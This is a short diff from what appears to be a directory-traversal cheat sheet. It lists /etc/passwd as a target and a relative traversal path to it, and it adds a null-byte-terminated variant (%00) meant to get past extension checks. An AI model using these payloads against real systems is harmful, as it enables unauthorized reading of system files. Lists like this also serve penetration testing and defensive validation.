@@ -64,3 +64,4 @@ Files to aim which a Directory Traversal
 
     /etc/passwd
     ../../../../etc/passwd
+    ../../../../etc/passwd%00
